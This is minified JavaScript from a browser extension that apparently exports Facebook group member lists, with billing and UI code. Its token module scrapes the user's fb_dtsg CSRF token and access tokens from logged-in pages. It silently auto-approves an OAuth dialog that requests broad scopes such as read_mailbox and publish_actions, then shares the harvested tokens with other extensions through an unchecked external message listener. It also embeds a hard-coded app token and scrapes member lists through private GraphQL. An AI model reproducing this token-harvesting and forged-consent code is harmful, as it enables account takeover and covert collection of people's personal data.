(window["webpackJsonp"] = window["webpackJsonp"] || []).push([
  ["chunk-common"],
  {
    "076e": function (t, e, s) {
      "use strict";
      var a = function () {
          var t = this,
            e = t._self._c;
          return e("div", { staticClass: "my-2" }, [
            e("div", { staticClass: "content is-small has-text-centered" }, [
              t._v(" © 2024 "),
              e("a", { on: { click: t.openWebsite } }, [t._v("Technical Soni ")]),
              t._v(" (v" + t._s(t.version) + ") "),
            ]),
          ]);
        },
        n = [],
        o = s("9845"),
        r = s.n(o),
        c = s("c276"),
        i = s("a553"),
        u = {
          data() {
            return { version: Object(c["d"])() };
          },
          methods: {
            openWebsite() {
              r.a.tabs.create({ url: i["d"] });
            },
          },
        },
        _ = u,
        d = s("2877"),
        l = Object(d["a"])(_, a, n, !1, null, null, null);
      e["a"] = l.exports;
    },
    "11a0": function (t, e, s) {
      "use strict";
      var a = s("2f62"),
        n = s("2a36"),
        o = s("9a1b");
      e["a"] = {
        computed: { ...Object(a["c"])(["userReady"]) },
        methods: {
          ...Object(a["b"])(["setUserReady", "setUserInfo", "setPro"]),
          async bootstrap() {
            const t = await Object(n["a"])();
            if ((this.setUserReady(t), t)) {
              const t = await n["d"].get();
              this.setUserInfo(t),
                o["a"](t.uid).then((t) => {
                  this.setPro(t);
                });
            }
          },
        },
      };
    },
    "2a36": function (t, e, s) {
      "use strict";
      s.d(e, "b", function () {
        return d;
      }),
        s.d(e, "c", function () {
          return l;
        }),
        s.d(e, "a", function () {
          return f;
        }),
        s.d(e, "d", function () {
          return b;
        });
      var a = s("d3ff"),
        n = (s("caad"), s("9845")),
        o = s.n(n),
        r = s("c276"),
        c = s("9a1b");
      function i() {
        function t() {
          return new Promise(function (t, e) {
            u().then((s) => {
              o.a.runtime.lastError
                ? e(o.a.runtime.lastError)
                : c["b"](s).then(t).catch(e);
            });
          });
        }
        return t();
      }
      function u() {
        return new Promise(function (t, e) {
          const s = o.a.runtime.getManifest(),
            { client_id: a, scopes: n } = s.oauth2,
            c = o.a.identity.getRedirectURL(),
            i = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${a}&response_type=token&redirect_uri=${encodeURIComponent(
              c
            )}&scope=${encodeURIComponent(n.join(" "))}`;
          o.a.identity
            .launchWebAuthFlow({ url: i, interactive: !0 })
            .then((s) => {
              if (!s.includes("#")) return e("auth fail");
              s = s.replace("#", "?");
              const { access_token: a } = Object(r["c"])(s);
              t(a);
            });
        });
      }
      const _ = "user";
      async function d() {
        const t = await i();
        return await b.set(t), t;
      }
      const l = async () => {
          await b.del();
        },
        f = async () => {
          const t = await b.get();
          return !!t.email;
        },
        b = {
          get: async () => {
            const t = await a["a"](_);
            return JSON.parse(t[_] || "{}");
          },
          set: (t) => a["c"]({ [_]: JSON.stringify(t) }),
          del: () => a["b"](_),
        };
    },
    4360: function (t, e, s) {
      "use strict";
      var a = s("2b0e"),
        n = s("2f62");
      a["a"].use(n["a"]),
        (e["a"] = new n["a"].Store({
          state: {
            fbReady: !1,
            tools: [],
            userInfo: {},
            userReady: !1,
            pro: { vip: 0 },
          },
          getters: {},
          mutations: {
            setFbReady(t, e) {
              t.fbReady = e;
            },
            setTools(t, e) {
              t.tools = e;
            },
            setUserReady(t, e) {
              t.userReady = e;
            },
            setPro(t, e) {
              t.pro = e;
            },
            setUserInfo(t, e) {
              t.userInfo = e;
            },
          },
          actions: {},
        }));
    },
    "6bc9": function (t, e, s) {
      "use strict";
      s.d(e, "b", function () {
        return o;
      }),
        s.d(e, "a", function () {
          return r;
        }),
        s.d(e, "c", function () {
          return c;
        });
      s("caad"), s("d9e2");
      var a = s("d3ff");
      const n = "https://graph.facebook.com/",
        o = () => i("me?fields=id"),
        r = (t) => i(`v1.0/${t}?fields=member_count`),
        c = async (t, e = null, s = 0xf4f0ba13f14a4) => {
          const {
              fb_user_id: n,
              fb_dtsg: o,
              jazoest: r,
              fb_rev: c,
            } = await a["a"](["fb_user_id", "fb_dtsg", "jazoest", "fb_rev"]),
            i = 10,
            _ = e && e.end_cursor ? "" + e.end_cursor : "";
          return await u(
            `av=${n}&__usid=6-Tqxgk291bqmgmq%3APqxgk1rt81ogp%3A0-Aqxgianj7wk4n-RV%3D6%3AF%3D&__user=${n}&__a=1&__dyn=&__req=4d&__hs=18846.EXP2%3Acomet_pkg.2.1.0.0&dpr=1.5&__ccg=EXCELLENT&__rev=${c}&__s=2trifr%3Aca8nd8%3A6qwirw&__hsi=6993582792974352909-0&__comet_req=1&fb_dtsg=${o}&jazoest=${r}&lsd=VZ0IKB1XzUOr0p5nT-is_6&__spin_r=1004221973&__spin_b=trunk&__spin_t=1628320383&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=PresenceStatusProviderSubscription_ContactProfilesQuery&variables={"count":${i},"cursor":"${_}","groupID":"${t}","recruitingGroupFilterNonCompliant":false,"scale":1.5,"id":"${t}"}&doc_id=${s}`
          );
        };
      async function i(t) {
        const { fb_access_token: e } = await a["a"]("fb_access_token");
        let s = `${n}${t}`;
        const o = s.includes("?") ? "&" : "?";
        s = `${s}${o}access_token=${e}`;
        const r = await fetch(s);
        if (200 !== r.status) throw new Error("network err: " + r.status);
        const c = await r.json();
        return c;
      }
      async function u(t) {
        const e = await fetch("https://www.facebook.com/api/graphql/", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          },
          mode: "cors",
          credentials: "include",
          body: t,
        });
        return await e.json();
      }
    },
    "9a1b": function (t, e, s) {
      "use strict";
      s.d(e, "b", function () {
        return r;
      }),
        s.d(e, "a", function () {
          return c;
        }),
        s.d(e, "c", function () {
          return i;
        });
      s("d9e2");
      var a = s("bc3a"),
        n = s.n(a),
        o = s("a553");
      const r = (t) => _("/l", { token: t, app: o["a"] }),
        c = async (t) => u("/v2", { uid: t }),
        i = async () => u("/t", { app: o["a"] });
      async function u(t, e = {}) {
        const s = await n.a.get(o["b"] + t, { params: e }),
          { status: a, data: r } = s;
        if (200 === a && "0" === r.code) return r.data;
        throw new Error("api call error");
      }
      async function _(t, e = {}) {
        (t = o["b"] + t),
          Object.keys(e).length > 0 &&
            (t += "?" + new URLSearchParams(e).toString());
        const s = await fetch(t);
        if (200 === s.status) {
          const { code: t, data: e } = await s.json();
          if ("0" === t) return e;
        }
        throw new Error("Network error");
      }
    },
    "9b24": function (t, e, s) {
      "use strict";
      s("a0ae");
    },
    a0ae: function (t, e, s) {},
    a553: function (t, e, s) {
      "use strict";
      s.d(e, "a", function () {
        return n;
      }),
        s.d(e, "b", function () {
          return r;
        }),
        s.d(e, "d", function () {
          return c;
        }),
        s.d(e, "c", function () {
          return i;
        }),
        s.d(e, "f", function () {
          return u;
        }),
        s.d(e, "g", function () {
          return _;
        }),
        s.d(e, "e", function () {
          return d;
        });
      var a = s("d3ff");
      const n = 7,
        o = { dev: "http://localhost:3000", prod: "https://b.unispy.io/shop" },
        r = o.prod,
        c = "https://fb-group-extractor.unispy.io",
        i = { normal: 20, vip: 1e6 },
        u = {
          get: async () => {
            const { interval: t } = await a["a"](["interval"]);
            return t || [5, 12];
          },
          set: (t) => a["c"]({ interval: t }),
        },
        _ = {
          get: async () => {
            const { pause: t } = await a["a"](["pause"]);
            return t || { num: 20, wait: 2 };
          },
          set: (t) => a["c"]({ pause: t }),
        },
        d = {
          get: async () => {
            const { export_type: t } = await a["a"](["export_type"]);
            return t || "excel";
          },
          set: (t) => a["c"]({ export_type: t }),
        };
    },
    c276: function (t, e, s) {
      "use strict";
      s.d(e, "c", function () {
        return o;
      }),
        s.d(e, "d", function () {
          return r;
        }),
        s.d(e, "b", function () {
          return c;
        }),
        s.d(e, "f", function () {
          return i;
        }),
        s.d(e, "e", function () {
          return u;
        }),
        s.d(e, "a", function () {
          return _;
        });
      s("907a"), s("3c5d"), s("fa9e"), s("77d9");
      var a = s("9845"),
        n = s.n(a);
      function o(t) {
        const e = {};
        for (const [s, a] of new URL(
          t || window.location.href
        ).searchParams.entries())
          e[s] = a;
        return e;
      }
      function r() {
        return n.a.runtime.getManifest().version;
      }
      function c(t) {
        return n.a.runtime.getURL(t);
      }
      function i(t) {
        return new Promise(function (e) {
          return setTimeout(e, t);
        });
      }
      function u(t, e) {
        return (
          (t = Math.ceil(t)),
          (e = Math.floor(e)),
          Math.floor(Math.random() * (e - t + 1)) + t
        );
      }
      function _(t, e, s) {
        const a = new Blob([t], { type: s || "application/octet-binary" }),
          n = URL.createObjectURL(a);
        var o = document.createElement("a");
        (o.style.display = "none"),
          (o.href = n),
          o.setAttribute("download", e),
          "undefined" === typeof o.download &&
            o.setAttribute("target", "_blank"),
          document.body.appendChild(o),
          o.click(),
          document.body.removeChild(o),
          setTimeout(() => {
            window.URL.revokeObjectURL(n);
          }, 100);
      }
    },
    d3ff: function (t, e, s) {
      "use strict";
      s.d(e, "a", function () {
        return o;
      }),
        s.d(e, "c", function () {
          return r;
        }),
        s.d(e, "b", function () {
          return c;
        });
      var a = s("9845"),
        n = s.n(a);
      const o = (t) => n.a.storage.local.get(t),
        r = (t) => n.a.storage.local.set(t),
        c = (t) => n.a.storage.local.remove(t);
    },
    d5be: function (t, e, s) {
      "use strict";
      var a = function () {
          var t = this,
            e = t._self._c;
          return e(
            "div",
            { staticClass: "buy box" },
            [
              e(
                "table",
                { staticClass: "table is-fullwidth is-striped mb-2" },
                [
                  e("thead", [
                    e("tr", [
                      e("th"),
                      e(
                        "th",
                        {
                          staticClass: "has-text-centered has-text-grey-light",
                        },
                        [t._v("Free")]
                      ),
                      e(
                        "th",
                        { staticClass: "has-text-centered has-text-danger" },
                        [
                          e("b-icon", {
                            attrs: {
                              pack: "fas",
                              icon: "gem",
                              size: "is-small",
                            },
                          }),
                          e("span", [t._v("Pro")]),
                        ],
                        1
                      ),
                    ]),
                  ]),
                  e("tbody", [
                    e("tr", [
                      e("td", [t._v("Export member list from groups")]),
                      e("td", { staticClass: "has-text-centered" }, [
                        t._v(t._s(t.FETCH_MAX.normal)),
                      ]),
                      e(
                        "td",
                        {
                          staticClass: "has-text-centered has-text-weight-bold",
                        },
                        [t._v("UNLIMITED")]
                      ),
                    ]),
                    t._m(0),
                  ]),
                ]
              ),
              t.pro.vip
                ? [
                    e("table", { staticClass: "table is-fullwidth" }, [
                      e("tr", [
                        e("td", [t._v("Your Plan")]),
                        e(
                          "td",
                          [
                            e(
                              "b-tag",
                              {
                                staticClass: "has-text-weight-bold",
                                attrs: {
                                  type:
                                    1 === t.pro.vip
                                      ? "is-danger"
                                      : "is-warning",
                                },
                              },
                              [
                                e("b-icon", {
                                  attrs: { pack: "fas", icon: "gem" },
                                }),
                                e("span", [t._v("")]),
                              ],
                              1
                            ),
                          ],
                          1
                        ),
                      ]),
                      t.pro.next_bill_date
                        ? e("tr", [
                            e("td", [t._v("Next Billing Date:")]),
                            e("td", [
                              t._v(
                                t._s(
                                  new Date(
                                    t.pro.next_bill_date
                                  ).toLocaleString()
                                )
                              ),
                            ]),
                          ])
                        : t._e(),
                      t.pro.cancellation_effective_date
                        ? e("tr", [
                            e("td", [t._v("Plan End Date:")]),
                            e("td", [
                              t._v(
                                " " +
                                  t._s(
                                    new Date(
                                      t.pro.cancellation_effective_date
                                    ).toLocaleString()
                                  ) +
                                  " "
                              ),
                            ]),
                          ])
                        : t._e(),
                      e("tr", [
                        e("td", [t._v("Billing Email:")]),
                        e("td", [t._v(t._s(t.pro.email))]),
                      ]),
                    ]),
                    e(
                      "div",
                      { staticClass: "buttons" },
                      [
                        t.pro.update_url
                          ? e(
                              "b-button",
                              {
                                attrs: {
                                  type: "is-primary is-light",
                                  outlined: "",
                                  expanded: "",
                                },
                                on: {
                                  click: function (e) {
                                    return t.openUrl(t.pro.update_url);
                                  },
                                },
                              },
                              [t._v(" Update Billing Info ")]
                            )
                          : t._e(),
                        t.pro.cancel_url
                          ? e(
                              "b-button",
                              {
                                attrs: {
                                  type: "is-danger is-light",
                                  outlined: "",
                                  expanded: "",
                                },
                                on: {
                                  click: function (e) {
                                    return t.openUrl(t.pro.cancel_url);
                                  },
                                },
                              },
                              [t._v(" Cancel Subscription ")]
                            )
                          : t._e(),
                      ],
                      1
                    ),
                    t.pro.msg
                      ? e(
                          "b-notification",
                          {
                            attrs: {
                              type: "is-warning is-light",
                              closable: !1,
                            },
                          },
                          [
                            e("b-icon", {
                              attrs: { pack: "fas", icon: "info-circle" },
                            }),
                            t._v(" " + t._s(t.pro.msg) + " "),
                          ],
                          1
                        )
                      : t._e(),
                  ]
                : [
                    e(
                      "div",
                      {
                        staticClass:
                          "has-text-centered has-background-warning discount mb-3",
                      },
                      [
                        e(
                          "p",
                          [
                            t._v(" 20% Off, "),
                            e("b-icon", {
                              staticStyle: { color: "white" },
                              attrs: {
                                pack: "fas",
                                icon: "bolt",
                                size: "is-small",
                                "custom-class": "my-icon",
                              },
                            }),
                            t._v(" Limited time offer. "),
                          ],
                          1
                        ),
                      ]
                    ),
                    e(
                      "ul",
                      { staticClass: "price-list is-flex" },
                      t._l(t.plan, function (s) {
                        return e("li", { key: s.id }, [
                          e("div", { staticClass: "card" }, [
                            e(
                              "div",
                              { staticClass: "card-content" },
                              [
                                e(
                                  "h2",
                                  {
                                    staticClass:
                                      "is-size-7 has-text-weight-semibold mb-1",
                                  },
                                  [t._v(" " + t._s(s.name) + " ")]
                                ),
                                e(
                                  "p",
                                  { staticClass: "reserve has-text-centered" },
                                  [
                                    e("b-tag", { attrs: { rounded: "" } }, [
                                      t._v(" " + t._s(s.reservePrice) + " "),
                                    ]),
                                  ],
                                  1
                                ),
                                s.popular
                                  ? e(
                                      "b-tag",
                                      {
                                        staticClass:
                                          "popular has-text-weight-semibold is-success is-light",
                                      },
                                      [t._v(" Most Popular ")]
                                    )
                                  : t._e(),
                                e(
                                  "div",
                                  {
                                    staticClass:
                                      "month-amt has-text-black is-size-4 has-text-weight-semibold has-text-centered",
                                  },
                                  [
                                    e(
                                      "span",
                                      {
                                        staticClass:
                                          "symbol is-size-7 has-text-grey-light has-text-weight-normal",
                                      },
                                      [t._v("$")]
                                    ),
                                    t._v(t._s(s.pricePerMonth)),
                                    e(
                                      "span",
                                      {
                                        staticClass:
                                          "is-size-7 has-text-weight-normal",
                                      },
                                      [t._v("/mo")]
                                    ),
                                  ]
                                ),
                                e(
                                  "p",
                                  {
                                    staticClass:
                                      "total-amt has-text-centered has-text-grey mb-2",
                                  },
                                  [
                                    t._v(
                                      " $" +
                                        t._s(s.price) +
                                        " billed " +
                                        t._s(s.month) +
                                        " month "
                                    ),
                                  ]
                                ),
                                e(
                                  "a",
                                  {
                                    staticClass:
                                      "button is-danger is-fullwidth has-text-weight-semibold",
                                    on: {
                                      click: function (e) {
                                        return t.buy(s.id);
                                      },
                                    },
                                  },
                                  [e("span", [t._v("Try it now")])]
                                ),
                              ],
                              1
                            ),
                          ]),
                        ]);
                      }),
                      0
                    ),
                    e(
                      "p",
                      { staticClass: "confident has-text-grey mt-2" },
                      [
                        e("b-icon", {
                          attrs: {
                            pack: "fas",
                            icon: "lock",
                            size: "is-small",
                            "custom-class": "my-icon",
                          },
                        }),
                        t._v(" We use "),
                        e("span", { staticClass: "has-text-weight-bold" }, [
                          t._v("Paddle™️"),
                        ]),
                        t._v(" or "),
                        e("span", { staticClass: "has-text-weight-bold" }, [
                          t._v("Paypal™️"),
                        ]),
                        t._v(
                          " to process purchases and do not keep your card details. "
                        ),
                      ],
                      1
                    ),
                    e("div", { staticClass: "has-text-centered" }, [
                      e("img", { attrs: { src: t.safeLogo, width: "360" } }),
                    ]),
                  ],
            ],
            2
          );
        },
        n = [
          function () {
            var t = this,
              e = t._self._c;
            return e("tr", [
              e("td", [t._v("Extract userid, username etc")]),
              e("td", { staticClass: "has-text-centered" }, [
                e("span", { staticClass: "icon has-text-danger is-small" }, [
                  e("i", { staticClass: "fas fa-check-circle" }),
                ]),
              ]),
              e("td", { staticClass: "has-text-centered" }, [
                e("span", { staticClass: "icon has-text-danger is-small" }, [
                  e("i", { staticClass: "fas fa-check-circle" }),
                ]),
              ]),
            ]);
          },
        ],
        o = s("2f62"),
        r = s("9845"),
        c = s.n(r),
        i = s("a553"),
        u = s("c276"),
        _ = {
          name: "Buy",
          data() {
            return {
              WEB: i["d"],
              FETCH_MAX: i["c"],
              safeLogo: Object(u["b"])("/assets/secure-payment.jpg"),
            };
          },
          computed: {
            ...Object(o["c"])(["userInfo", "pro"]),
            plan() {
              return this.pro.plan || [];
            },
          },
          methods: {
            buy(t) {
              const { uid: e } = this.userInfo,
                s = `${i["b"]}/pay2?uid=${e}&planId=${t}`;
              c.a.tabs ? c.a.tabs.create({ url: s }) : window.open(s);
            },
            openUrl(t) {
              c.a.tabs.create({ url: t });
            },
          },
          mounted() {},
        },
        d = _,
        l = (s("9b24"), s("2877")),
        f = Object(l["a"])(d, a, n, !1, null, null, null);
      e["a"] = f.exports;
    },
    fdde: function (t, e, s) {
      "use strict";
      s.d(e, "a", function () {
        return c;
      }),
        s.d(e, "b", function () {
          return l;
        });
      s("d9e2");
      var a = s("9845"),
        n = s.n(a),
        o = s("d3ff"),
        r = s("6bc9");
      async function c(t = !1) {
        if (!t) {
          const { fb_user_id: t, fb_access_token: e } = await o["a"]([
            "fb_user_id",
            "fb_access_token",
          ]);
          if (e)
            try {
              const { id: e } = await r["b"]();
              if (e == t) return;
            } catch (c) {
              console.log(c);
            }
          const s = await l.tryGet();
          if (s) return;
        }
        let e = {};
        try {
          e = await p();
        } catch (c) {
          if ("please login facebook." != c.message) throw c;
          e = await h();
        }
        await o["c"](e);
        const s = await g();
        await o["c"]({ jazoest: s });
        const a = await m();
        await o["c"](a);
        const n = await w();
        await o["c"]({ fb_token_ig: n, fb_access_token: n }),
          await l.broadcast();
      }
      const i = "__sync_fb_unispy_token",
        u = "__get_fb_unispy_token",
        _ = async () => {
          const {
            fb_dtsg: t,
            fb_user_id: e,
            fb_name: s,
            fb_avator: a,
            fb_rev: n,
            jazoest: r,
            fb_token_studio: c,
            fb_token_ads: i,
            fb_token_ig: u,
            fb_access_token: _,
          } = await o["a"]([
            "fb_dtsg",
            "fb_user_id",
            "fb_name",
            "fb_avator",
            "fb_rev",
            "jazoest",
            "fb_token_studio",
            "fb_token_ads",
            "fb_token_ig",
            "fb_access_token",
          ]);
          return t
            ? JSON.stringify({
                fb_dtsg: t,
                fb_user_id: e,
                fb_name: s,
                fb_avator: a,
                fb_rev: n,
                jazoest: r,
                fb_token_studio: c,
                fb_token_ads: i,
                fb_token_ig: u,
                fb_access_token: _,
              })
            : "";
        },
        d = async (t) => {
          if (!t) return;
          const e = JSON.parse(t),
            {
              fb_dtsg: s,
              fb_user_id: a,
              fb_name: n,
              fb_avator: r,
              fb_rev: c,
              jazoest: i,
              fb_token_studio: u,
              fb_token_ads: _,
              fb_token_ig: d,
              fb_access_token: l,
            } = e;
          await o["c"]({
            fb_dtsg: s,
            fb_user_id: a,
            fb_name: n,
            fb_avator: r,
            fb_rev: c,
            jazoest: i,
            fb_token_studio: u,
            fb_token_ads: _,
            fb_token_ig: d,
            fb_access_token: l,
          });
        },
        l = {
          tryGet: async () => {
            const { appid_list: t } = await o["a"](["appid_list"]),
              e = t || [];
            for (const a of e)
              try {
                const t = await n.a.runtime.sendMessage(a, { [u]: !0 });
                if (t.token) return await d(t.token), !0;
              } catch (s) {
                console.log(s);
              }
            return !1;
          },
          broadcast: async () => {
            const t = await _();
            if (!t) return;
            const { appid_list: e } = await o["a"](["appid_list"]),
              s = e || [];
            for (const o of s)
              try {
                await n.a.runtime.sendMessage(o, { [i]: t });
              } catch (a) {
                console.log(a);
              }
          },
          listen: () => {
            n.a.runtime.onMessageExternal.addListener(async (t) => {
              const e = t[i],
                s = t[u];
              if (e) await d(e);
              else if (s) {
                const t = await _();
                return Promise.resolve({ token: t });
              }
            });
          },
        };
      function f(t, e) {
        const s = e.exec(t);
        return s && s.length > 1 ? s[1] : "";
      }
      const b = (t) =>
        t.replace(/\\u[\dA-F]{4}/gi, (t) =>
          String.fromCharCode(parseInt(t.replace(/\\u/g, ""), 16))
        );
      async function p() {
        const t = await v(
            "https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed"
          ),
          e = t.match(/\{\\"dtsg\\":\{\\"token\\":\\"([^\\]+)/);
        if (!e) throw new Error("please login facebook.");
        const s = e[1];
        let a = t.match(/\\"NAME\\":\\"([^"]+)/);
        a = a[1].slice(0, -1).replace(/\\\\/g, "\\");
        const n = b(a);
        let o = t.match(/\\"ACCOUNT_ID\\":\\"([^"]+)/);
        o = o[1].slice(0, -1).replace(/\\\\/g, "\\");
        let r = t.match(/\\"USER_ID\\":\\"([^"]+)/);
        if (((r = r[1].slice(0, -1).replace(/\\\\/g, "\\")), r != o))
          throw new Error(
            "Please switch Facebook to user account. It doesn't support page account."
          );
        const c = t.match(/server_revision+\\":+(\d+)/)[1],
          i = `https://graph.facebook.com/${o}/picture?type=large&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`;
        return (
          console.log(
            "[fb_dtsg]",
            s,
            "[fb_user_id]",
            o,
            "[fb_name]",
            n,
            "[fb_rev]",
            c
          ),
          { fb_dtsg: s, fb_user_id: o, fb_name: n, fb_avator: i, fb_rev: c }
        );
      }
      async function h() {
        const t = await v("https://business.facebook.com/creatorstudio/home"),
          e = t.match(/DTSGInitData.*token":"(.*)","async_get_token/);
        if (!e) throw new Error("please login facebook.");
        const s = e[1];
        let a = t.match(/"NAME":"([^"]+)/);
        a = a[1].slice(0, -1).replace(/\\\\/g, "\\");
        const n = b(a);
        let o = t.match(/"ACCOUNT_ID":"(\d+)/);
        o = o[1];
        let r = t.match(/"USER_ID":"(\d+)/);
        if (((r = r[1]), r != o))
          throw new Error(
            "Please switch Facebook to user account. It doesn't support page account."
          );
        const c = t.match(/server_revision":(\d+)/)[1],
          i = `https://graph.facebook.com/${o}/picture?type=large&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`;
        return {
          fb_dtsg: s,
          fb_user_id: o,
          fb_name: n,
          fb_avator: i,
          fb_rev: c,
        };
      }
      async function g() {
        const { fb_dtsg: t } = await o["a"]("fb_dtsg");
        let e = "";
        for (var s = 0; s < t.length; s++) e += t.charCodeAt(s);
        return (e = "2" + e), console.log("[jazoest]", e), e;
      }
      async function m() {
        const t = await v("https://business.facebook.com/creatorstudio/home"),
          e = f(t, /userAccessToken":"(\w+)"/g);
        return console.log("[token cs]", e), { fb_token_studio: e };
      }
      async function w() {
        const t = await v(
            "https://www.facebook.com/dialog/oauth?scope=user_about_me,user_actions.books,user_actions.fitness,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_friends,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_managed_groups,user_photos,user_posts,user_relationship_details,user_relationships,user_religion_politics,user_status,user_tagged_places,user_videos,user_website,user_work_history,email,manage_notifications,manage_pages,publish_actions,publish_pages,read_friendlists,read_insights,read_page_mailboxes,read_stream,rsvp_event,publish_to_groups, groups_access_member_info, read_mailbox&response_type=token&client_id=124024574287414&redirect_uri=fbconnect%3A%2F%2Fsuccess&sso_key=com&display="
          ),
          e = f(t, /\\"scope\\" value=\\"(.+?)\\/g),
          s = f(t, /\\"encrypted_post_body\\" value=\\"(.+?)\\/g);
        console.log("[scopex]", e, "[encrypted_post_body]", s);
        const { fb_dtsg: a, jazoest: n } = await o["a"](["fb_dtsg", "jazoest"]),
          r = await y(
            "https://www.facebook.com/v1.0/dialog/oauth/skip/submit/",
            `jazoest=${n}&fb_dtsg=${a}&from_post=1&__CONFIRM__=1&scope=${e}&display=page&sdk=&domain=&sso_device=ios&state=&user_code=&nonce=&auth_type=&auth_nonce=&nonce=&return_format%5B%5D=access_token&encrypted_post_body=${s}`
          ),
          c = f(r, /#(?:access_token)=([\S\s]*?)&/g);
        return console.log("[token ig]", c), c;
      }
      async function v(t, e = "text") {
        const s = await fetch(t, {
          method: "GET",
          mode: "cors",
          credentials: "include",
          headers: {
            referrer: "https://m.facebook.com",
            "sec-fetch-site": "none",
          },
        });
        return "json" === e ? await s.json() : await s.text();
      }
      async function y(t, e, s = "text") {
        const a = await fetch(t, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          },
          mode: "cors",
          credentials: "include",
          body: e,
        });
        return "json" === s ? await a.json() : await a.text();
      }
    },
  },
]);
